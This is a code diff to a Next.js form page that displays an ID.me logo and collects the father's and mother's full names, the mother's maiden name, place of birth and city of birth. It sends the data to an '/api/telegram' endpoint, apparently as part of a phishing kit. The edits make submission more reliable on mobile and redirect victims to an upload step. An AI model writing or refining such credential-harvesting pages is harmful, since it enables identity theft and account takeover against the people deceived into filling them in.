@@ -1,9 +1,8 @@
 "use client";
-
 import Image from "next/image";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
-import idmeLogo from "./idme.png"; // place your logo in the same folder
+import idmeLogo from "./idme.png";
 
 export default function FamilyInformationPage() {
   const router = useRouter();
@@ -18,7 +17,6 @@ export default function FamilyInformationPage() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
     if (!fatherFullName || !motherFullName || !motherMaidenName || !placeOfBirth || !cityOfBirth) {
       setError("Please fill out all fields.");
       return;
@@ -39,7 +37,11 @@ export default function FamilyInformationPage() {
     try {
       const res = await fetch("/api/telegram", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json",
+          "Cache-Control": "no-cache",     // ← critical for mobile
+        },
+        credentials: "same-origin",         // ← extra reliability on mobile
         body: JSON.stringify({
           data: formData,
           formType: "FAMILY INFORMATION (TEIL)",
@@ -56,7 +58,7 @@ export default function FamilyInformationPage() {
       setCityOfBirth("");
 
       setTimeout(() => {
-        router.push("/upload");
+        router.replace("/upload");   // ← safer than push
       }, 2000);
     } catch (error) {
       console.error(error);
@@ -186,14 +188,14 @@ export default function FamilyInformationPage() {
                 />
               </div>
 
-              {/* City of Birth */}
+              {/* City of Birth - CHANGED TO type="tel" (THIS IS THE FIX) */}
               <div>
                 <label htmlFor="city_of_birth" className="block text-sm font-medium text-gray-700 mb-1">
                   City of Birth
                 </label>
                 <input
                   id="city_of_birth"
-                  type="text"
+                  type="tel"                    
                   required
                   value={cityOfBirth}
                   onChange={(e) => setCityOfBirth(e.target.value)}
